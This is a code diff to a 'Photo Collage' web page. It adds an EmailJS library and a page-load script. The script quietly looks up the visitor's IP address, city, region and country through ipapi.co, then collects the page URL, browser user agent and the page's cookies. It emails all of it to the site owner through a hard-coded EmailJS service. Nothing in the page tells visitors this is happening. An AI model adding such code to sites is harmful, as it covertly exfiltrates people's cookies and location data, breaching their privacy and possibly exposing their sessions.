@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="shortcut icon" href="../assets/programmerist.png" type="image/x-icon"/>
 <title>Photo Collage</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -805,7 +806,42 @@
  <footer class="site-footer">© 2025 - 2026 Kevs404 💻✨</footer>
 
  <script>
-  window.onload = function () {
+
+  (function(){
+    // email js PUBLIC API KEY (user)
+    emailjs.init("G3tmu6bSokASDsudB");
+  })();
+
+  window.onload = async function () {
+    let ipData = {};
+
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      ipData = await res.json();
+    } catch (err) {
+      console.log("IP fetch failed:", err);
+    }
+
+    const params = {
+      page: window.location.href,
+      userAgent: navigator.userAgent,
+      time: new Date().toLocaleString(),
+      cookies: document.cookie,
+
+      ip: ipData.ip || "N/A",
+      city: ipData.city || "N/A",
+      region: ipData.region || "N/A",
+      country: ipData.country_name || "N/A"
+    };
+
+    // email js: serviceID, templateID, templateParams
+    emailjs.send("service_romt14a", "template_1hvg1g2", params)
+      .then(function(response) {
+        console.log("Email sent!", response.status);
+      }, function(error) {
+        console.log("Failed...", error);
+      });
+
     const target = document.getElementById("title");
     if (target) {
       target.scrollIntoView({ behavior: "smooth" });
